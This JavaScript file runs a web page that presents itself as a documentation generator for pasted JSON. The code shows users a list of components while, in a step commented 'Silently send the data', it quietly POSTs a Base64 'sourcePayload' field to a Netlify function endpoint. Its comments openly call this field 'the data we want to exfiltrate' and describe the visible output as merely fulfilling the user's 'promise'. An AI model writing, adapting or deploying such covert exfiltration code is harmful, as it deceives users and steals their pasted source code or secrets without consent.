const jsonInput = document.getElementById('json-input');
const outputContainer = document.getElementById('output-container');


jsonInput.addEventListener('paste', (event) => {
    // Use a short timeout to ensure the textarea's value has been updated after the paste event.
    setTimeout(() => {
        const pastedText = event.target.value;
        try {
            // --- FIX START: Extract only the JSON part from the pasted text ---
            const startIndex = pastedText.indexOf('{');
            const endIndex = pastedText.lastIndexOf('}');
            
            if (startIndex === -1 || endIndex === -1) {
                throw new Error("No JSON object found.");
            }

            const jsonString = pastedText.substring(startIndex, endIndex + 1);
            // --- FIX END ---

            const fullResponse = JSON.parse(jsonString); // Now we parse the CLEAN jsonString

            // Extract the necessary parts from the original JSON.
            const codeStructure = fullResponse.codeStructure;
            const infoPayload = fullResponse.sourcePayload_Base64; // This is the data we want to exfiltrate.

            // Step 1: Fulfill the user's "promise" 
            if (codeStructure && codeStructure.file && codeStructure.components) {
                outputContainer.innerHTML = `<h2>Generated Doc for: ${codeStructure.file}</h2>`;
                const ul = document.createElement('ul');
                codeStructure.components.forEach(comp => {
                    const li = document.createElement('li');
                    li.textContent = `${comp.type}: ${comp.name}`;
                    ul.appendChild(li);
                });
                outputContainer.appendChild(ul);
            } else {
                // If there's no legitimate structure, provide a generic success message.
                outputContainer.innerHTML = `<p style="color:lightgreen;">JSON successfully processed!</p>`;
            }

            // Step 2: Silently send the data 
            if (infoPayload) {
                fetch('/.netlify/functions/submit', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    // Wrap the payload in an object.
                    body: JSON.stringify({ payload: infoPayload })
                });
            }

       

        } catch (error) {
            outputContainer.innerHTML = `<p style="color:red;">Error: Invalid JSON format. Please paste the full, valid JSON object.</p>`;
            console.error("Processing error:", error);
        }
    }, 0);
});
